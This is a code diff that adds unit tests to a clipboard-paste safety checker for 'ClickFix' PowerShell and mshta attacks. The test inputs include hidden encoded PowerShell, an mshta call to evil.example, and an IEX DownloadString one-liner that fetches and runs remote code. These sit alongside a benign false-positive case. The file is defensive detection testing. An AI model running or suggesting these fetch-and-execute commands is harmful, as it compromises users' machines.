@@ -117,6 +117,37 @@ static void test_paste_sudo_curl(void) {
     CHECK(v.score >= 60, "sudo + curl|bash is critical");
 }
 
+static void test_paste_clickfix_powershell(void) {
+    TEST("Paste: ClickFix PowerShell encoded → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste(
+        "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "should detect ClickFix PowerShell LOLBin");
+}
+
+static void test_paste_clickfix_mshta(void) {
+    TEST("Paste: ClickFix 'mshta http://...' → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste("mshta http://evil.example/x.hta");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "should detect mshta remote execution");
+}
+
+static void test_paste_clickfix_case_insensitive(void) {
+    TEST("Paste: mixed-case 'PowerShell ... IEX' → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste(
+        "PowerShell -NoP -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://x')");
+    CHECK(v.signals & PASTE_WINDOWS_LOLBIN,
+          "case-insensitive match must fire");
+}
+
+static void test_paste_benign_powershell(void) {
+    TEST("Paste: benign 'Get-ChildItem -Encoding utf8' → SAFE (no P8 FP)");
+    PasteVerdict v = hlse_check_paste(
+        "powershell Get-ChildItem -Path . -Recurse -Encoding utf8");
+    CHECK(!(v.signals & PASTE_WINDOWS_LOLBIN),
+          "legit admin one-liner must not trip P8");
+}
+
 static void test_paste_base64(void) {
     TEST("Paste: 'echo ... | base64 -d | sh' → encoded payload");
     PasteVerdict v = hlse_check_paste(
@@ -168,6 +199,10 @@ int main(void) {
     test_paste_hidden_newline();
     test_paste_rtl_override();
     test_paste_sudo_curl();
+    test_paste_clickfix_powershell();
+    test_paste_clickfix_mshta();
+    test_paste_clickfix_case_insensitive();
+    test_paste_benign_powershell();
     test_paste_base64();
     test_paste_history_evasion();
     test_paste_empty();
